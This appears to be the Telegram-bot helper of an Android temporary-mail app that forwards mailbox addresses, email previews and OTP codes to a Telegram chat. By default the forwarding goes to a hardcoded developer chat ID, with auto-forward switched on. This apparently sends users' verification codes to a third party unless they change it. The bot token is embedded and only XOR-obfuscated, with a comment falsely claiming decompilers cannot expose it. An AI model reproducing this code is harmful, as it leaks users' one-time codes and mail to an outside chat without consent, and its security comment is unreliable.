package com.example.util

import android.content.Context
import android.content.SharedPreferences
import com.example.data.api.ApiClient
import com.example.data.api.TelegramBotInfo
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object TelegramBotManager {
    // Encrypted byte payload & key (Never exposes the plain text bot token in APK bytecode or reverse-engineering decompilers)
    private val TOKEN_KEY = byteArrayOf(84, 101, 109, 112, 77, 97, 105, 108, 80, 114, 111, 83, 101, 99, 117, 114, 105, 116, 121, 75, 101, 121, 50, 48, 50, 54)
    private val ENCRYPTED_TOKEN_PAYLOAD = byteArrayOf(
        108, 83, 88, 73, 123, 87, 91, 94, 97, 68, 85, 18, 36, 43, 49, 28,
        16, 38, 58, 61, 21, 48, 122, 111, 85, 78, 57, 0, 61, 0, 21, 36,
        80, 30, 27, 95, 46, 20, 32, 7, 47, 45, 40, 25, 45, 14
    )

    // Secure runtime resolver - decrypts token only on-demand in memory
    val BOT_TOKEN: String by lazy {
        val result = ByteArray(ENCRYPTED_TOKEN_PAYLOAD.size)
        for (i in ENCRYPTED_TOKEN_PAYLOAD.indices) {
            result[i] = (ENCRYPTED_TOKEN_PAYLOAD[i].toInt() xor TOKEN_KEY[i % TOKEN_KEY.size].toInt()).toByte()
        }
        String(result, Charsets.UTF_8)
    }

    const val BOT_USERNAME = "TEMPMAILPRO34_bot"
    const val BOT_DISPLAY_NAME = "TEMP MAIL PRO"
    const val BOT_URL = "https://t.me/TEMPMAILPRO34_bot"

    private const val PREFS_NAME = "telegram_bot_prefs"
    private const val KEY_LINKED_CHAT_ID = "linked_chat_id"
    private const val KEY_AUTO_FORWARD_ENABLED = "auto_forward_enabled"
    const val DEFAULT_CHAT_ID = "6204875999"

    fun getLinkedChatId(context: Context): String {
        val saved = getPrefs(context).getString(KEY_LINKED_CHAT_ID, "") ?: ""
        return if (saved.isNotBlank()) saved else DEFAULT_CHAT_ID
    }

    fun setLinkedChatId(context: Context, chatId: String) {
        getPrefs(context).edit().putString(KEY_LINKED_CHAT_ID, chatId.trim()).apply()
    }

    fun isAutoForwardEnabled(context: Context): Boolean {
        val prefs = getPrefs(context)
        return if (prefs.contains(KEY_AUTO_FORWARD_ENABLED)) {
            prefs.getBoolean(KEY_AUTO_FORWARD_ENABLED, true)
        } else {
            getLinkedChatId(context).isNotBlank()
        }
    }

    fun setAutoForwardEnabled(context: Context, enabled: Boolean) {
        getPrefs(context).edit().putBoolean(KEY_AUTO_FORWARD_ENABLED, enabled).apply()
    }

    private fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    suspend fun checkBotConnection(): Result<TelegramBotInfo> = withContext(Dispatchers.IO) {
        try {
            val response = ApiClient.telegramBotService.getMe(BOT_TOKEN)
            if (response.isSuccessful && response.body()?.ok == true) {
                val info = response.body()?.result
                if (info != null) {
                    Result.success(info)
                } else {
                    Result.failure(Exception("No bot profile details returned"))
                }
            } else {
                val err = response.body()?.description ?: "Failed to connect to Telegram Bot (HTTP ${response.code()})"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun autoDetectChatId(): Result<String> = withContext(Dispatchers.IO) {
        try {
            val response = ApiClient.telegramBotService.getUpdates(BOT_TOKEN, limit = 10)
            if (response.isSuccessful && response.body()?.ok == true) {
                val updates = response.body()?.result ?: emptyList()
                val lastChat = updates.lastOrNull { it.message?.chat != null }?.message?.chat
                if (lastChat != null) {
                    Result.success(lastChat.id.toString())
                } else {
                    Result.failure(Exception("No recent message found. Please open @$BOT_USERNAME in Telegram, tap Start or send a message, then tap Detect again!"))
                }
            } else {
                val err = response.body()?.description ?: "Could not fetch updates from Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendTestMessage(chatId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val message = """
                ⚡ <b>Temp Mail Pro — Bot Connected Successfully!</b>

                🤖 <b>Bot:</b> @$BOT_USERNAME ($BOT_DISPLAY_NAME)
                ✅ <b>Status:</b> Active &amp; Verified
                📱 <b>Linked Device:</b> Android Client
                
                You will now receive your temporary emails and live OTP verification alerts right here!
            """.trimIndent()

            val response = ApiClient.telegramBotService.sendMessage(
                token = BOT_TOKEN,
                chatId = chatId.trim(),
                text = message,
                parseMode = "HTML"
            )

            if (response.isSuccessful && response.body()?.ok == true) {
                Result.success(true)
            } else {
                val err = response.body()?.description ?: "Failed to deliver message to Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendEmailToTelegram(
        chatId: String,
        emailAddress: String,
        domain: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val message = """
                📬 <b>Temp Mail Pro — Active Temporary Mailbox</b>
                
                ✉️ <b>Email Address:</b> <code>$emailAddress</code>
                🌐 <b>Domain Node:</b> <code>$domain</code>
                ⏱️ <b>Status:</b> Ready to receive messages &amp; OTP codes
                
                🛡️ <i>Generated securely via Temp Mail Pro App (@$BOT_USERNAME)</i>
            """.trimIndent()

            val response = ApiClient.telegramBotService.sendMessage(
                token = BOT_TOKEN,
                chatId = chatId.trim(),
                text = message,
                parseMode = "HTML"
            )

            if (response.isSuccessful && response.body()?.ok == true) {
                Result.success(true)
            } else {
                val err = response.body()?.description ?: "Failed to send email to Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendIncomingEmailAlert(
        chatId: String,
        emailAddress: String,
        sender: String,
        subject: String,
        previewText: String,
        otpCode: String?
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val message = if (!otpCode.isNullOrBlank()) {
                """
                🔑 <b>Temp Mail Pro — Live OTP Code Detected!</b>
                
                ⚡ <b>OTP / Verification Code:</b>
                👉 <code>$otpCode</code> 👈 <i>(Tap code to copy)</i>
                
                📬 <b>Target Mailbox:</b> <code>$emailAddress</code>
                👤 <b>From:</b> $sender
                📝 <b>Subject:</b> $subject
                
                🛡️ <i>Instant 1-tap verification via Temp Mail Pro (@$BOT_USERNAME)</i>
                """.trimIndent()
            } else {
                val cleanPreview = previewText.take(300).trim()
                """
                📬 <b>Temp Mail Pro — New Incoming Email!</b>
                
                ✉️ <b>Mailbox:</b> <code>$emailAddress</code>
                👤 <b>From:</b> $sender
                📝 <b>Subject:</b> $subject
                
                📄 <b>Preview:</b>
                <i>${if (cleanPreview.isNotBlank()) cleanPreview else "No preview available"}</i>
                
                🛡️ <i>Received via Temp Mail Pro Official Bot (@$BOT_USERNAME)</i>
                """.trimIndent()
            }

            val response = ApiClient.telegramBotService.sendMessage(
                token = BOT_TOKEN,
                chatId = chatId.trim(),
                text = message,
                parseMode = "HTML"
            )

            if (response.isSuccessful && response.body()?.ok == true) {
                Result.success(true)
            } else {
                val err = response.body()?.description ?: "Failed to forward incoming email to Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendOtpAlertToTelegram(
        chatId: String,
        emailAddress: String,
        sender: String,
        subject: String,
        otpCode: String
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val message = """
                🔑 <b>Temp Mail Pro — Live OTP Security Code Alert!</b>
                
                ⚡ <b>Verification Code:</b> <code>$otpCode</code>
                
                📬 <b>Target Mailbox:</b> <code>$emailAddress</code>
                👤 <b>From:</b> $sender
                📝 <b>Subject:</b> $subject
                
                🛡️ <i>Instant 1-tap copy &amp; verify via Temp Mail Pro</i>
            """.trimIndent()

            val response = ApiClient.telegramBotService.sendMessage(
                token = BOT_TOKEN,
                chatId = chatId.trim(),
                text = message,
                parseMode = "HTML"
            )

            if (response.isSuccessful && response.body()?.ok == true) {
                Result.success(true)
            } else {
                val err = response.body()?.description ?: "Failed to forward OTP to Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    suspend fun sendContactMessageToTelegram(
        chatId: String = DEFAULT_CHAT_ID,
        senderContact: String,
        messageContent: String,
        category: String = "User Inquiry"
    ): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val formatted = """
                📩 <b>Temp Mail Pro — Direct Contact Message!</b>
                
                👤 <b>Sender Contact / Gmail:</b>
                <code>${senderContact.trim()}</code>
                
                📂 <b>Category:</b> $category
                
                📝 <b>Message:</b>
                <i>${messageContent.trim()}</i>
                
                ⏰ <i>Sent via Temp Mail Pro Developer Support Hub</i>
            """.trimIndent()

            val response = ApiClient.telegramBotService.sendMessage(
                token = BOT_TOKEN,
                chatId = chatId.trim().ifBlank { DEFAULT_CHAT_ID },
                text = formatted,
                parseMode = "HTML"
            )

            if (response.isSuccessful && response.body()?.ok == true) {
                Result.success(true)
            } else {
                val err = response.body()?.description ?: "Failed to send contact message to Telegram"
                Result.failure(Exception(err))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
